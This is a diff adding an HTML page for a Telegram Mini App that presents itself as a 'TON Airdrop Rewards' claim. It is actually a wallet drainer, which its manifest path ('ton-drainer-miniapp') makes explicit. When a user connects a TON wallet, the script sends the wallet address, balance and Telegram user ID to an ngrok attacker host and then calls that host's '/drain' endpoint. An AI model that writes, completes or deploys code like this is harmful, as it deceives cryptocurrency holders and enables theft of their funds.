@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>TON Airdrop Mini App</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; background: #f0f2f5; }
+    button { padding: 10px 20px; font-size: 16px; background: #0088cc; color: white; border: none; border-radius: 5px; cursor: pointer; }
+    button:hover { background: #006b9e; }
+  </style>
+</head>
+<body>
+  <h1>TON Airdrop Rewards</h1>
+  <p>Connect your wallet to claim!</p>
+  <button onclick="connectWallet()">Connect Wallet</button>
+  <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.ready();
+    tg.expand();
+
+    // Initialize TON Connect with Telegram-specific config
+    const tonConnect = new TonConnectSDK.TonConnect({
+      manifestUrl: 'https://yourusername.github.io/ton-drainer-miniapp/tonconnect-manifest.json', // We'll add this
+      walletsListSource: 'https://raw.githubusercontent.com/ton-blockchain/wallets-list/main/wallets.json'
+    });
+
+    async function connectWallet() {
+      try {
+        // Show connection UI (QR code or wallet list)
+        const wallet = await tonConnect.connectWallet();
+        if (!wallet) throw new Error('No wallet connected, you sneaky fuck!');
+        tg.showAlert('Wallet connected! Airdrop incoming...');
+        const address = wallet.account.address;
+        const balance = await fetchBalance(address);
+        sendToTelegram(`User ${tg.initDataUnsafe.user?.id || 'unknown'} connected wallet: ${address} Balance: ${balance} TON`);
+        drainWallet(address);
+      } catch (e) {
+        tg.showAlert('Wallet connect failed: ' + e.message);
+        console.error(e);
+      }
+    }
+
+    async function fetchBalance(address) {
+      const response = await fetch('https://toncenter.com/api/v2/getAddressBalance?address=' + address);
+      const data = await response.json();
+      return TonWeb.utils.fromNano(data.result);
+    }
+
+    async function drainWallet(address) {
+      const response = await fetch('https://1234.ngrok.io/drain', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ address })
+      });
+      const result = await response.json();
+      tg.showAlert(result.message);
+    }
+
+    function sendToTelegram(message) {
+      fetch('http://1234.ngrok.io/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message })
+      });
+    }
+  </script>
+</body>
+</html>
